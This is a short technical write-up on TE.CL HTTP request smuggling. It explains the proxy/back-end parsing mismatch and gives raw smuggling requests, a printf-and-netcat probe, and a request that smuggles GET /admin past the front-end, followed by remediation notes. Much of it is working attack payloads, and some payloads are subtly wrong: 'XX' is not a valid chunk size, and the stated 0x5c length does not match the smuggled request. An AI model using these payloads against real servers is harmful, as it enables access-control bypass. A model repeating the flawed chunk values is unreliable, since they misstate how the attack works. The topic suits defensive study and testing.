# TE.CL — Transfer-Encoding / Content-Length Discrepancy

## Summary
The front-end proxy uses Transfer-Encoding: chunked to determine the body boundary, while the back-end server uses Content-Length. This is rarer than CL.TE but equally dangerous.

## How It Works

```
Front-end reads Transfer-Encoding → consumes all chunks
Back-end reads Content-Length → consumes only X bytes
Remaining bytes interpreted as start of next request

POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

XX
GPOST / HTTP/1.1
Host: target.com

0

```

The front-end reads the full chunked body (including "0\r\n") and forwards everything. The back-end reads only 4 bytes (Content-Length: 4), so "GPOST..." becomes the start of the next request.

## Detection

```bash
# Send TE.CL probe
{
  printf "POST / HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "Content-Length: 4\r\n"
  printf "Transfer-Encoding: chunked\r\n"
  printf "Connection: keep-alive\r\n"
  printf "\r\n"
  printf "5c\r\n"
  printf "GET /404 HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "\r\n"
  printf "0\r\n"
  printf "\r\n"
} | nc -w 5 target.com 80
```

The "GET /404 HTTP/1.1" is hex 5c bytes, encoded as a chunk. The front-end processes all chunks including the terminator. The back-end only reads 4 bytes and interprets the remainder as a new request.

## Confirmed Exploitation

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

XX
GET /admin HTTP/1.1
Host: target.com
Foo: bar

0

```

The smuggled request is processed as the next request on the connection.

## Remediation
- Front-end must strip Transfer-Encoding when forwarding to back-end
- Back-end must reject chunked encoding when a Content-Length is present
- Use consistent HTTP version across the entire request path
